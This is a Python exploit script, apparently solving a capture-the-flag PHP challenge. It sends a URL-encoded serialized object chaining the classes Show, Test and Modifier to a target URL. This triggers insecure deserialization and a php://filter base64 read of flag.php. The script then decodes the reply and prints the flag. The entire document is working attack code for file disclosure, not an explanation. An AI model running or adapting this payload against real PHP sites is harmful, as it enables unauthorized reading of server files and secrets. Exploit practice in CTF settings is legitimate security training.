#! /bin/python3

from sys import argv

if __name__ == '__main__':
    try:
        url = argv[1]
    except Exception as e:
        print("python3 exp.py url")
    else:
        from requests import get

        payload = '?pop=O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A' \
                  '%22source' \
                  '%22%3Bs%3A3%3A%22aaa%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8' \
                  '%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert' \
                  '.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D '
        url = url + payload

        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/109.0.0.0 Safari/537.36 "
        }

        response = get(url=url, headers=headers).text

        from base64 import b64decode
        from re import findall

        flag = "".join(findall("flag{.*?}", b64decode(response).decode()))
        print(flag)


    finally:
        print("payload较长响应可能较慢")
